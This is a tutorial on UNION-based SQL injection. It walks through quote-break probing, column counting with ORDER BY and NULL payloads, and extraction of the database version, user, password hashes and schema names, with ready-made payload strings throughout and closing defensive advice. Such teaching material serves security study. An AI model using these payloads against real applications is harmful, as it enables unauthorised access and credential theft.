# 🔗 SQL UNION Attack (UNION-based SQL Injection)

A **SQL UNION attack** is a type of SQL injection where an attacker abuses the `UNION` / `UNION ALL` operator to **combine the results of a malicious `SELECT`** with the results of the application's intended query.

## Why `UNION` is Useful to Attackers

`UNION` lets you stack query results together:

- The first `SELECT` is the query the app intended to run.
- The second `SELECT` is attacker-controlled.

If the app displays the result rows, then the attacker can display:
- Usernames and password hashes
- Emails, API keys, tokens
- DB version, current user
- Table and column names (depending on DB)

## Typical Vulnerable Pattern

**Unsafe code (conceptual):**
```sql
SELECT name, price FROM products WHERE category = 'Gifts' AND released = 1;
```

If the application builds it like this:
```
... WHERE category = '" + input + "' ...
```

Then attacker input becomes part of SQL.

## Core Requirements for a UNION Attack

To successfully use `UNION`, the attacker generally needs:

1. **The same number of columns** in both `SELECT` statements
2. **Compatible data types** in each column position
3. A place in the application where **results are reflected** (rendered) to the response

## Step-by-Step: Finding a Working UNION Payload

Assume a parameter like:
```
GET /products?category=Gifts
```

And the backend query becomes:
```sql
... WHERE category = 'Gifts'
```

### 1) Confirm Injection

A simple quote can break the query:
```
Gifts'
```

If the page errors or behavior changes, injection is likely.

### 2) Find the Number of Columns

**Method A: `ORDER BY` Probing:**
```
Gifts' ORDER BY 1--
Gifts' ORDER BY 2--
Gifts' ORDER BY 3--
```

When it fails, you have exceeded the column count.

**Method B: `UNION SELECT` with increasing columns:**
```
Gifts' UNION SELECT NULL--
Gifts' UNION SELECT NULL,NULL--
Gifts' UNION SELECT NULL,NULL,NULL--
```

The first one that succeeds indicates the right column count.

### 3) Identify Which Columns are Reflected

Once you know the column count, inject visible markers:
```
Gifts' UNION SELECT 'AAA','BBB','CCC'--
```

If the page prints `BBB`, then the second column is reflected.

If strings fail (type mismatch), fall back to `NULL` for most columns and only use strings in likely text columns.

## Attack Examples

### Example A: Extract Database Version

If 2 columns are required and the first column is reflected:
```
Gifts' UNION SELECT @@version, NULL--
```

Common alternatives:
- MySQL: `version()`
- PostgreSQL: `version()`
- Oracle: `banner` from `v$version`

### Example B: Read Current Database User

```
Gifts' UNION SELECT user(), NULL--
```

Alternatives:
- PostgreSQL: `current_user`
- SQL Server: `SYSTEM_USER`

### Example C: Dump Users Table Data

Assume the app query has 2 columns and prints the first column.

If the database has a `users` table with `username` and `password_hash`:

```
Gifts' UNION SELECT username, password_hash FROM users--
```

If you only have **one reflected column**, combine fields into one string (DB-specific concatenation):
- MySQL: `CONCAT(username,':',password_hash)`
- PostgreSQL: `username || ':' || password_hash`
- SQL Server: `username + ':' + password_hash`

Example (MySQL style):
```
Gifts' UNION SELECT CONCAT(username,':',password_hash), NULL FROM users--
```

## Enumerating Tables and Columns

If metadata is accessible, attackers can discover schema info.

### Using `information_schema` (MySQL, PostgreSQL, many others)

List tables:
```
Gifts' UNION SELECT table_name, NULL FROM information_schema.tables--
```

List columns for a table:
```
Gifts' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
```

### SQL Server Approach

Tables:
```
Gifts' UNION SELECT name, NULL FROM sys.tables--
```

Columns:
```
Gifts' UNION SELECT name, NULL FROM sys.columns WHERE object_id = OBJECT_ID('users')--
```

## UNION vs UNION ALL

- `UNION` removes duplicates (may be slower and can hide rows)
- `UNION ALL` keeps duplicates (often preferred by attackers)

Example:
```
Gifts' UNION ALL SELECT username, password_hash FROM users--
```

## Common Reasons UNION Attacks Fail

- Wrong number of columns
- Data type mismatch (string vs integer)
- Results are not displayed by the app
- WAF or input filtering blocks keywords like `UNION`
- Query uses different structure (e.g., `INSERT`, `UPDATE`)

## Defensive Guidance

1. **Use parameterized queries** everywhere
2. **Avoid string concatenation** when building SQL
3. Use least-privilege DB accounts
4. Hide DB error messages from users
5. Add allowlist validation for expected inputs
6. Add monitoring for suspicious patterns (`UNION`, `'--`, `ORDER BY` probes)

## Quick Safe Example

Conceptual example:
```sql
SELECT name, price FROM products WHERE category = ? AND released = 1;
```

The database treats the input as **data**, not executable SQL, so `UNION` cannot change the query structure.
